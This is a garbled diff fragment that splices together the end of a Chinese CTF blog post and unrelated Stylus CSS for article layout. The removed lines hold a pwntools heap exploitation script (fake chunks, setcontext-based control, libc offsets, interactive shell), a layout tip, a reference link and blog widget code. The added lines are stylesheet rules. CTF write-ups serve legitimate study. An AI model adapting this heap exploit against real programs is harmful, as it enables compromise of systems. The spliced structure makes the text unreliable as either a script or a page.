class="line">        payload = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span> + p64(heap_addr) + p64(ret)</span><br><span class="line">        create(<span class="number">0x400</span>, payload)</span><br><span class="line">        create(<span class="number">0x3f0</span>, p64(libc.symbols[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span> + libc_base))</span><br><span class="line"></span><br><span class="line">        delete(<span class="number">15</span>)</span><br><span class="line">        <span class="comment"># delete(9)</span></span><br><span class="line">        create(</span><br><span class="line">            <span class="number">0xb40</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xb08</span> +</span><br><span class="line">            flat(<span class="number">0x521</span> | <span class="number">4</span>, libc_base + <span class="number">0x1e4030</span>, libc_base + <span class="number">0x1e4030</span>,</span><br><span class="line">                 heap_base + <span class="number">0x6020</span>, heap_base + <span class="number">0x6020</span>))</span><br><span class="line">        create(<span class="number">0x610</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x608</span> + p64(<span class="number">0x500</span> | <span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        create(<span class="number">0x510</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;&gt;&gt; &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;(: Size:&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(<span class="number">0x2000</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="comment"># gdb.attach(r)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>在前面chunk布局的时候最好多放点chunk，不然就跟我一样后续加很麻烦。</p>
-<hr>
-<p>参考文章：</p>
-<p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598" >https://www.anquanke.com/post/id/235598<i class="fas fa-external-link-alt"></i></a></p>
-
-        </div>
-
-        
-
-        
-            <div class="article-nav">
-                
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2022/05/17/house-of-emma/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">house of emma</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2022/05/10/musl1-2-2%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-starCTF-BabyNote%E5%A4%8D%E7%8E%B0/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">musl1.2.2源码分析+starCTF-BabyNote复现</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
-
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
-    </div>
-    
-
-        
-            
-    <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
-        <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
-            }
-
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
-            } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
-            }
-        </script>
-    </div>
+    +keep-mobile() {
+      font-size: $article-title-font-size * 0.8;
+    }
+  }
 
 
+  .article-header {
+    position: relative;
+    padding-left: $avatarWidth;
+    width: 100%;
+    height: $avatarWidth;
+    box-sizing: border-box;
 
-        
-    
-</div>
+    .avatar {
+      position: absolute;
+      top: 0
+      left: 0;
+      width: $avatarWidth;
+      height: $avatarWidth;
+      padding: 1px;
+      box-sizing: border-box;
+      border: 1px solid var(--border-color);
+      border-radius: 50%;
 
-            </div>
-        
-    </div>
-</div>
+      img {
+        border-radius: 50%;
+        width: 100%;
+        height: 100%;
+        background: var(--avatar-background-color);
+      }
+
+    }
+
+
+    .info {
+      padding: 2px 0;
+      margin-left: 10px;
+      box-sizing: border-box;
+      display: flex;
+      flex-direction: column;
+      justify-content: space-between;
+      width: 100%;
+      height: 100%;
+
+      .author {
+        font-weight: 600;
+        font-size: 1.18rem;
+        display: flex;
+        align-items: center;
+
+        .name {
+          color: var(--default-text-color);
+        }
+
+        .author-label {
+          margin-left: 10px;
+          font-size: 0.8rem;
+          font-weight: 500;
+          padding: 0 5px;
+          border-radius: 5px;
+          color: #fff;
+          background: var(--selection-color);
+        }
+
+      }
+    }
+
+  }
+
+
+  .article-header, .article-header-meta-info {
+    margin-top: 16px;
+    +keep-tablet() {
+      transform: scale(0.9);
+      transform-origin: left top;
+    }
+  }
+
+
+  .article-content {
+    margin-top: $component-spacing-value;
+    padding-bottom: 10px;
+    word-wrap: break-word;
+    border-bottom: 1px solid var(--border-color);
+    color: var(--default-text-color);
+  }
+
+  .post-copyright-info {
+    margin-top: $component-spacing-value;
+    width: 100%;
+  }
+
+  .article-nav {
+    height: 40px;
+    margin-top: $component-spacing-value;
+
+    .article-prev, .article-next {
+      max-width: $post-nav-max-width;
+      height: 100%;
+      box-sizing: border-box;
+
+      keep-container(true, 1.03, 1.03, 10px, 0);
+
+      a {
+        position: relative;
+        display: block;
+        width: 100%;
+        height: 100%;
+        box-sizing: border-box;
+
+        &.prev {
+          padding-left: $arrow-icon-width;
+        }
+
+        &.next {
+          padding-right: $arrow-icon-width;
+        }
+
+        .arrow-icon {
+          position: absolute;
+          top: 0;
+          height: 100%;
+          width: $arrow-icon-width;
+
+          &.left {
+            left: 0;
+          }
+
+          &.right {
+            right: 0;
+          }
+        }
+
+        .title {
+          width: 100%;
+          height: 100%;
+        }
+      }
+
+    }
+
+    .article-prev {
+      float: left;
+    }
+
+    .article-next {
+      float: right;
+    }
+
+    .post-nav-item {
+      display: none;
+
+      +keep-tablet() {
+        display: inline-block;
+      }
+
+    }
+
+
+    .post-nav-title-item {
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+
+      +keep-tablet() {
+        display: none;
+      }
+    }
+
+  }
+
+
+}
+
 
 
                 
